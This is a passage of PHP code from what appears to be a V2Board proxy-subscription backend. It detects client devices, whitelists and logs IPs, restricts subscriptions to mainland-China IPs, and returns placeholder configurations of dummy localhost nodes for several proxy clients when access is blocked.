        } elseif (strpos($userAgent, 'shadowrocket') !== false) {
            return 'Shadowrocket';
        } elseif (strpos($userAgent, 'surge') !== false) {
            return 'Surge';
        }

        // 检测操作系统
        if (strpos($userAgent, 'android') !== false) {
            return 'Android';
        } elseif (strpos($userAgent, 'iphone') !== false || strpos($userAgent, 'ipad') !== false) {
            return 'iOS';
        } elseif (strpos($userAgent, 'mac os x') !== false || strpos($userAgent, 'macintosh') !== false) {
            return 'macOS';
        } elseif (strpos($userAgent, 'windows') !== false) {
            return 'Windows';
        } elseif (strpos($userAgent, 'linux') !== false) {
            return 'Linux';
        }

        return 'Unknown';
    }

    /**
     * ✅ 检测设备类型（简化版，不依赖第三方库）
     *
     * @param string $userAgent 小写的 User-Agent 字符串
     * @return string
     */
    private function detectDeviceType($userAgent)
    {
        // 检测移动设备
        $mobileKeywords = ['mobile', 'android', 'iphone', 'ipod', 'blackberry', 'windows phone'];
        foreach ($mobileKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                return 'Mobile';
            }
        }

        // 检测平板
        $tabletKeywords = ['ipad', 'tablet', 'kindle'];
        foreach ($tabletKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                return 'Tablet';
            }
        }

        // 默认为桌面设备
        return 'Desktop';
    }

    /**
     * 向白名单插入一条IP记录（insertOrIgnore 防并发重复）
     */
    private function insertWhitelist($userId, $ip, $location, $remarkPrefix)
    {
        $parts = array_filter([
            $location['country']  ?? '',
            $location['province'] ?? '',
            $location['city']     ?? '',
            $location['isp']      ?? '',
        ]);
        DB::table('v2_subscribe_whitelist')->insertOrIgnore([
            'user_id'    => $userId,
            'ip'         => $ip,
            'country'    => $location['country']  ?? null,
            'province'   => $location['province'] ?? null,
            'city'       => $location['city']     ?? null,
            'isp'        => $location['isp']      ?? null,
            'remark'     => $remarkPrefix . ($parts ? ' · ' . implode(' ', $parts) : ''),
            'created_at' => time(),
        ]);
    }

    /**
     * 记录被拦截的订阅拉取请求
     */
    private function logBlockedAccess($user, $ip, $userAgent, $os, $deviceType, $location, $reason)
    {
        try {
            DB::table('v2_subscribe_pull_log')->insert([
                'user_id'      => $user->id,
                'ip'           => $ip,
                'user_agent'   => $userAgent,
                'os'           => $os,
                'device'       => $deviceType,
                'country'      => $location['country'] ?? null,
                'province'     => $location['province'] ?? null,
                'city'         => $location['city'] ?? null,
                'blocked'      => 1,
                'block_reason' => $reason,
                'created_at'   => now(),
            ]);
        } catch (\Exception $e) {
            Log::error('记录拦截日志失败', ['ip' => $ip, 'error' => $e->getMessage()]);
        }
    }

    /**
     * 检测IP是否为中国大陆IP
     * 排除港澳台，只允许 countryCode === CN
     */
    private function isMainlandChinaIp($location)
    {
        $countryCode = $location['countryCode'] ?? '';
        $country     = $location['country'] ?? '';

        // 内网IP视为中国大陆（本地测试用）
        if ($country === '内网') {
            return true;
        }

        // countryCode 为空说明 API 查询失败，放行避免误拦截
        if ($countryCode === '') {
            return true;
        }

        // 港澳台各有独立 countryCode，直接排除
        if (in_array($countryCode, ['HK', 'MO', 'TW'], true)) {
            return false;
        }

        // 仅允许 CN（中国大陆）
        return $countryCode === 'CN';
    }

    /**
     * ✅ 返回假节点订阅（用于非中国大陆IP）
     * 返回一个不可用的节点，节点名称显示提示信息
     *
     * @param Request $request
     * @param object $user
     * @param string $ip
     * @param array $location
     * @return \Illuminate\Http\Response
     */
    private function returnFakeSubscription(Request $request, string $reason, string $hint = '')
    {
        $flag = $request->input('flag') ?? ($_SERVER['HTTP_USER_AGENT'] ?? '');
        $flag = strtolower($flag);

        $siteNode   = config('v2board.app_url', config('v2board.app_name', 'V2Board'));
        $reasonNode = $reason;
        $hintNode   = $hint;

        $fakeProxy = [
            'server' => '127.0.0.1',
            'port'   => 10086,
            'uuid'   => '00000000-0000-0000-0000-000000000000',
        ];

        // Clash 系列
        if (strpos($flag, 'clash') !== false || strpos($flag, 'stash') !== false || strpos($flag, 'mihomo') !== false) {
            $hintEntry = $hintNode ? "\n  - name: \"{$hintNode}\"\n    type: vmess\n    server: {$fakeProxy['server']}\n    port: {$fakeProxy['port']}\n    uuid: {$fakeProxy['uuid']}\n    alterId: 0\n    cipher: auto\n    udp: true" : '';
            $hintGroup = $hintNode ? "\n      - \"{$hintNode}\"" : '';

            $yaml = <<<YAML
mixed-port: 7890
allow-lan: false
mode: rule
log-level: info

proxies:
  - name: "{$siteNode}"
    type: vmess
    server: {$fakeProxy['server']}
    port: {$fakeProxy['port']}
    uuid: {$fakeProxy['uuid']}
    alterId: 0
    cipher: auto
    udp: true
  - name: "{$reasonNode}"
    type: vmess
    server: {$fakeProxy['server']}
    port: {$fakeProxy['port']}
    uuid: {$fakeProxy['uuid']}
    alterId: 0
    cipher: auto
    udp: true{$hintEntry}

proxy-groups:
  - name: "PROXY"
    type: select
    proxies:
      - "{$siteNode}"
      - "{$reasonNode}"{$hintGroup}

rules:
  - MATCH,PROXY
YAML;

            return response($yaml, 200)
                ->header('Content-Type', 'text/yaml; charset=utf-8')
                ->header('Content-Disposition', 'attachment; filename="config.yaml"')
                ->header('Subscription-Userinfo', 'upload=0; download=0; total=0; expire=0');
        }
        // Sing-box 系列
        elseif (strpos($flag, 'sing') !== false || strpos($flag, 'hiddify') !== false) {
            $outbounds = [
                [
                    'tag'         => $siteNode,
                    'type'        => 'vmess',
                    'server'      => $fakeProxy['server'],
                    'server_port' => $fakeProxy['port'],
                    'uuid'        => $fakeProxy['uuid'],
                    'alter_id'    => 0,
                    'security'    => 'auto',
                ],
                [
                    'tag'         => $reasonNode,
                    'type'        => 'vmess',
                    'server'      => $fakeProxy['server'],
                    'server_port' => $fakeProxy['port'],
                    'uuid'        => $fakeProxy['uuid'],
                    'alter_id'    => 0,
                    'security'    => 'auto',
                ],
            ];
            if ($hintNode) {
                $outbounds[] = [
                    'tag'         => $hintNode,
                    'type'        => 'vmess',
                    'server'      => $fakeProxy['server'],
                    'server_port' => $fakeProxy['port'],
                    'uuid'        => $fakeProxy['uuid'],
                    'alter_id'    => 0,
                    'security'    => 'auto',
                ];
            }
            $outbounds[] = ['tag' => 'direct', 'type' => 'direct'];

            $json = [
                'log'      => ['level' => 'info'],
                'outbounds' => $outbounds,
                'route'    => ['final' => $siteNode],
            ];

            return response(json_encode($json, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT), 200)
                ->header('Content-Type', 'application/json; charset=utf-8')
                ->header('Subscription-Userinfo', 'upload=0; download=0; total=0; expire=0');
        }
        // Surge / Surfboard
        elseif (strpos($flag, 'surge') !== false || strpos($flag, 'surfboard') !== false) {
            $hintProxy = $hintNode ? "\n{$hintNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, username={$fakeProxy['uuid']}" : '';
            $hintGroup = $hintNode ? ", {$hintNode}" : '';

            $conf = <<<CONF
[General]
loglevel = notify

[Proxy]
{$siteNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, username={$fakeProxy['uuid']}
{$reasonNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, username={$fakeProxy['uuid']}{$hintProxy}

[Proxy Group]
PROXY = select, {$siteNode}, {$reasonNode}{$hintGroup}

[Rule]
FINAL,PROXY
CONF;

            return response($conf, 200)
                ->header('Content-Type', 'text/plain; charset=utf-8')
                ->header('Subscription-Userinfo', 'upload=0; download=0; total=0; expire=0');
        }
        // Loon
        elseif (strpos($flag, 'loon') !== false) {
            $hintProxy = $hintNode ? "\n{$hintNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, \"{$fakeProxy['uuid']}\", transport=tcp" : '';
            $hintGroup = $hintNode ? ", {$hintNode}" : '';

            $conf = <<<CONF
[Proxy]
{$siteNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, "{$fakeProxy['uuid']}", transport=tcp
{$reasonNode} = vmess, {$fakeProxy['server']}, {$fakeProxy['port']}, "{$fakeProxy['uuid']}", transport=tcp{$hintProxy}

[Remote Proxy]

[Proxy Group]
PROXY = select, {$siteNode}, {$reasonNode}{$hintGroup}

[Rule]
FINAL,PROXY
CONF;

            return response($conf, 200)
                ->header('Content-Type', 'text/plain; charset=utf-8')
                ->header('Subscription-Userinfo', 'upload=0; download=0; total=0; expire=0');
        }
        // 通用 Base64（Shadowrocket / Quantumult / v2rayN / v2rayNG 等）
        else {
            $makeVmess = fn(string $name) => 'vmess://' . base64_encode(json_encode([
                'v'    => '2',
                'ps'   => $name,
                'add'  => $fakeProxy['server'],
                'port' => (string)$fakeProxy['port'],
                'id'   => $fakeProxy['uuid'],
                'aid'  => '0',
                'net'  => 'tcp',
                'type' => 'none',
                'host' => '',
                'path' => '',
                'tls'  => '',
            ], JSON_UNESCAPED_UNICODE));

            $links = $makeVmess($siteNode) . "\n" . $makeVmess($reasonNode);
            if ($hintNode) {
                $links .= "\n" . $makeVmess($hintNode);
            }

            return response(base64_encode($links), 200)
                ->header('Content-Type', 'text/plain; charset=utf-8')
                ->header('Subscription-Userinfo', 'upload=0; download=0; total=0; expire=0');
        }
    }
}